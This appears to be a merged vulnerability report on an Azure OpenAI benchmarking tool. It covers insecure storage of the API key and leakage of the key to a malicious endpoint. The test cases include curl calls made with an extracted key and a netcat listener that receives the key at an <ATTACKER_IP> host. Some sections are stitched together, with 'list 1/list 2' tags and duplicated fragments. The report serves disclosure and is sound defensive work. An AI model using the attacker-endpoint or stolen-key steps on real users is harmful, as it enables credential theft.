### Vulnerability List

- **Vulnerability Name:** Insecure Storage of Azure OpenAI API Key
- **Description:** The Azure OpenAI benchmarking tool instructs users to store their Azure OpenAI API key in the `OPENAI_API_KEY` environment variable as part of the setup process. This practice, while convenient for testing, can lead to unintentional exposure of the API key if users are not careful about managing their environment variables securely. An attacker who gains access to the exposed API key can then make unauthorized calls to the victim's Azure OpenAI service.
    1. User follows the setup instructions in the README.md, which recommends setting the `OPENAI_API_KEY` environment variable.
    2. User insecurely manages the environment variable, for example by:
        - Hardcoding the API key directly into scripts used to run the benchmark tool.
        - Committing scripts containing the API key to version control systems (e.g., Git).
        - Exposing the API key in CI/CD pipeline logs or configuration files.
        - Leaving the environment variable set in shared or publicly accessible environments.
        - Storing the API key in plain text files that are not protected by appropriate file system permissions.
        - Accidentally exposing the environment variable in logs or command history.
    3. An attacker gains access to the exposed API key through one of the insecure management practices mentioned above.
    4. The attacker uses the stolen `OPENAI_API_KEY` to authenticate against the victim's Azure OpenAI service.
    5. The attacker can now make unauthorized requests to the Azure OpenAI API, potentially incurring costs for the victim, accessing deployed models, and potentially causing data breaches depending on the models and data accessed.
- **Impact:** Unauthorized access and usage of the victim's Azure OpenAI service. This can lead to:
    - **Financial costs:** Unauthorized usage of the Azure OpenAI service will be billed to the victim's Azure subscription.
    - **Data breaches:** Depending on the models deployed and the attacker's actions, sensitive data could be accessed or manipulated.
    - **Reputational damage:** If the unauthorized access is publicly disclosed, it can damage the victim's reputation.
    - **Access or modify data:** Attacker could access or modify data accessible through the Azure OpenAI service (depending on the service configuration and permissions).
    - **Malicious Use:** Potentially use the compromised service for malicious purposes, which could be attributed to the victim.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - **Warning in README.md:** The README.md includes a warning: "> :warning: **Code in this repo is written for testing purposes and should not be used in production**". This implicitly suggests caution but does not specifically address API key security.
    - **Security Reporting Guidelines:** The `SECURITY.md` file provides guidelines for reporting security vulnerabilities to Microsoft Security Response Center, indicating a commitment to security.
- **Missing Mitigations:**
    - **Explicit Security Warning in README.md:** The README.md should include a clear and explicit warning about the security risks of storing API keys in environment variables, even for testing purposes. This warning should advise users against insecure practices and recommend more secure alternatives.
    - **Recommendations for Secure API Key Management:** The README.md should suggest secure alternatives for managing API keys, especially for non-testing or more sensitive environments. Examples include:
        - Using secrets management tools like Azure Key Vault.
        - Storing the API key in a configuration file with restricted permissions, instead of environment variables.
        - For local testing, advising users to use environment variables only temporarily and to unset them after use.
    - **Code-Level Mitigation (Optional but Recommended):** Consider adding functionality to the tool to support reading the API key from more secure sources beyond just environment variables. This could include:
        - Reading from Azure Key Vault directly (if applicable to the intended users).
        - Supporting configuration files with restricted access.
- **Preconditions:**
    - The user must use the Azure OpenAI benchmarking tool and follow the setup instructions in the README.md.
    - The user must configure the tool by setting the `OPENAI_API_KEY` environment variable.
    - The user must then insecurely manage the `OPENAI_API_KEY` environment variable, making it accessible to potential attackers.
- **Source Code Analysis:**
    - **`benchmark/loadcmd.py`**:
        ```python
        api_key = os.getenv(args.api_key_env) # line 70 (from list 1)
        ```
        ```python
        api_key = os.getenv(args.api_key_env) # from list 2
        ```
        This line in `loadcmd.py` retrieves the API key from the environment variable specified by the `--api-key-env` argument, which defaults to `OPENAI_API_KEY`. This is the primary point where the API key is accessed from the environment.
    - **`benchmark/oairequester.py`**:
        ```python
        class OAIRequester:
            """
            ...
            :param api_key: Azure OpenAI resource endpoint key.

                self.api_key = api_key # line 37 (from list 1)
                self.url = url # line 38 (from list 1)
                self.backoff = backoff # line 39 (from list 1)

                ...
        ```
        ```python
        class OAIRequester: # from list 2
            def __init__(self, api_key: str, url: str, backoff=False): # from list 2
                self.api_key = api_key # from list 2

                } # from list 2
                response = await session.post(self.url, headers=headers, json=body) # from list 2
                # ... # from list 2
        ```
        The `OAIRequester` class stores the API key and uses it in the `api-key` header for each HTTP request to the Azure OpenAI API.
    - **`README.md`**:
        ```markdown
        2. Your resource endpoint and access key. The script assumes the key is stored in the following environment variable: ```OPENAI_API_KEY```. For more information on finding your endpoint and key, see the [Azure OpenAI Quickstart](https://learn.microsoft.com/azure/ai-services/openai/quickstart?tabs=command-line&pivots=programming-language-python#retrieve-key-and-endpoint). # from list 1 & 2
        ```
        This section in the README explicitly instructs users to store the API key in the `OPENAI_API_KEY` environment variable without sufficient security warnings.
    - **`benchmark/bench.py`**:
        ```python
        load_parser.add_argument("-k", "--api-key-env", ...)` # from list 2
        ```
        This part of the code defines the command-line argument `--api-key-env` which defaults to `OPENAI_API_KEY`.
- **Security Test Case:**
    1. **Initial Setup:** Ensure the `OPENAI_API_KEY` environment variable is **not** set in your testing environment.
    2. **Run Benchmark Tool without API Key:** Execute the benchmark tool using the `load` command as described in the README, providing a valid Azure OpenAI endpoint and deployment name.
        ```bash
        python -m benchmark.bench load --deployment <your-deployment-name> https://<your-aoai-endpoint>.openai.azure.com # from list 1
        ```
    3. **Verify Error Message:** Observe the output of the benchmark tool. It should fail to authenticate and display an error message indicating that the `OPENAI_API_KEY` environment variable is missing or invalid. This confirms that the tool relies on this environment variable for authentication.
    4. **Simulate API Key Exposure:**
        - **Manually set the `OPENAI_API_KEY` environment variable** with a valid Azure OpenAI API key for your test resource.
        - **Capture Network Request:** Use a network interception tool (like `tcpdump`, Wireshark, or browser developer tools if applicable) or a proxy to capture the HTTP requests made by the benchmark tool.
        - **Run the Benchmark Tool Again:** Execute the same benchmark command as in step 2.
        - **Inspect Captured Request:** Examine the captured HTTP request. Verify that the `api-key` header is present in the request and contains the value of the `OPENAI_API_KEY` environment variable you set. This confirms that the API key is transmitted in the HTTP header.
    5. **Unauthorized Access (Manual Verification):**
        - **Extract API Key:** Obtain the API key value from the `OPENAI_API_KEY` environment variable you set in step 4.
        - **Use `curl` to Simulate Attack:** Use `curl` or a similar HTTP client to make a direct request to the Azure OpenAI API, using the extracted API key for authentication. For example:
        ```bash
        curl -X POST https://<your-aoai-endpoint>.openai.azure.com/openai/deployments/<your-deployment-name>/chat/completions?api-version=2023-05-15 \
          -H "Content-Type: application/json" \
          -H "api-key: <your-extracted-api-key>" \
          -d '{"messages":[{"role": "user", "content": "This is a test."}]}' # from list 1
        ```
        - **Verify Unauthorized Access:** If the `curl` command successfully returns a response from the Azure OpenAI API, it demonstrates that an attacker with the exposed API key can indeed make unauthorized requests and access the service, confirming the vulnerability.
    6. **Alternative Test Case (from list 2):**
        a. **Setup:**
            i. Install the Azure OpenAI benchmarking tool.
            ii. Create a script (e.g., `run_benchmark.sh`) that sets the `OPENAI_API_KEY` environment variable with a hardcoded API key and runs the benchmarking tool:
            ```bash
            #!/bin/bash
            export OPENAI_API_KEY="YOUR_API_KEY_HERE" # Insecurely hardcoded API key
            python -m benchmark.bench load --deployment gpt-4 https://<your_aoai_endpoint>
            ```
            iii. Make the script executable: `chmod +x run_benchmark.sh`.
        b. **Execution:**
            i. Run the script: `./run_benchmark.sh`.
        c. **Verification of Vulnerability:**
            i. **Simulate Exposure:** Assume an attacker gains access to `run_benchmark.sh`.
            ii. **Unauthorized Access:** The attacker extracts the API key from `run_benchmark.sh` and uses it to make requests to the victim's Azure OpenAI service using `curl`:
            ```bash
            curl https://<your_aoai_endpoint>/openai/deployments/gpt-4/chat/completions?api-version=2023-05-15 \
              -H "Content-Type: application/json" \
              -H "api-key: YOUR_EXTRACTED_API_KEY" \
              -d '{"messages":[{"role": "user", "content": "Hello"}]}'
            ```
            iii. If the API call is successful, it demonstrates unauthorized access due to insecure API key storage.

- **Vulnerability Name:** API Key Exposure through Malicious Endpoint
- **Description:**
    1. An attacker crafts a malicious endpoint that mimics the expected behavior of an Azure OpenAI service for the benchmarking tool.
    2. The attacker then socially engineers a user into using this malicious endpoint URL with the benchmarking tool. This could be achieved through phishing, misleading instructions, or other social engineering techniques.
    3. The user, believing they are running a legitimate benchmark, executes the tool with their valid Azure OpenAI API key and the attacker's malicious endpoint URL.
    4. The benchmarking tool, as designed, sends requests to the specified endpoint, including the Azure OpenAI API key in the `api-key` header for authentication.
    5. The attacker's malicious endpoint captures and logs the incoming request headers, including the user's Azure OpenAI API key.
    6. The attacker now has access to the user's Azure OpenAI API key, which can be used to access and utilize the user's Azure OpenAI resources.
- **Impact:**
    Compromise of the user's Azure OpenAI API key. This allows the attacker to:
    - Access the user's Azure OpenAI service and resources.
    - Incur costs on the user's Azure subscription by making requests to the OpenAI service.
    - Potentially access or manipulate any data or models associated with the compromised Azure OpenAI resource, depending on the permissions associated with the API key.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - None in the code itself.
    - The `README.md` file includes warnings that the code is for testing purposes only and should not be used in production. However, it does not specifically address the risk of API key exposure through malicious endpoints.
- **Missing Mitigations:**
    - Input validation for the `--api-base-endpoint` command-line argument to ensure it points to a trusted Azure OpenAI endpoint. While complete validation is difficult, basic checks like ensuring the domain is within `openai.azure.com` could be implemented as a starting point.
    - Explicit warning in the `README.md` and command-line help output about the security risks of using the tool with untrusted endpoints and the potential for API key exposure.
    - Consider alternative methods for authentication during benchmarking that do not involve sending the API key to the endpoint if feasible, although this might be complex given the current design of Azure OpenAI authentication.
- **Preconditions:**
    - The attacker must successfully socially engineer a user to run the benchmarking tool against a malicious endpoint.
    - The user must have a valid Azure OpenAI API key configured in the `OPENAI_API_KEY` environment variable.
    - The user must execute the benchmarking tool with the `--api-base-endpoint` argument pointing to the attacker's malicious endpoint.
- **Source Code Analysis:**
    - **`benchmark/oairequester.py`**: The `OAIRequester` class is responsible for making requests to the Azure OpenAI endpoint.
    - `__init__(self, api_key: str, url: str, backoff=False)`: The constructor takes the `api_key` and `url` as input and stores them as instance attributes.
    - `async def call(self, session:aiohttp.ClientSession, body: dict) -> RequestStats`: This method sends the API request.
    - `headers = {"api-key": self.api_key, ...}`:  The `api_key` provided during `OAIRequester` initialization is directly included in the request headers.
    - `response = await session.post(self.url, headers=headers, json=body)`: The request is sent to `self.url`, which is taken directly from user input via command-line argument, with the API key in the headers.

    ```

- **Security Test Case:**
    1. **Setup Attacker Server:** On a machine controlled by the attacker, start a simple HTTP server that listens on port 8080 and logs all incoming request headers. For example, using Python:
        ```bash
        python -m http.server 8080
        ```
        Or using `netcat`:
        ```bash
        mkfifo /tmp/req
        while true; do nc -l -p 8080 < /tmp/req | tee /tmp/req; done
        ```
    2. **Prepare Benchmarking Environment:** On a separate machine (the user's machine):
        * Set the environment variable `OPENAI_API_KEY` to a **dummy but realistic-looking API key** (e.g., `sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`). **Do not use a real API key.**
        * Clone the benchmarking tool repository and install the requirements.
    3. **Execute Benchmarking Tool with Malicious Endpoint:** Run the benchmarking tool's load command, replacing `<ATTACKER_IP>` with the IP address of the attacker's server:
        ```bash
        python -m benchmark.bench load --deployment gpt-4 http://<ATTACKER_IP>:8080
        ```
    4. **Analyze Attacker Server Logs:** Check the logs of the HTTP server running on the attacker's machine.
    5. **Verify API Key Exposure:** The logs should contain a POST request to `/openai/deployments/gpt-4/chat/completions`. Within the headers of this request, you should find the `api-key` header, and its value should be the dummy API key you set in step 2. This confirms that the API key is transmitted to the attacker-controlled endpoint.
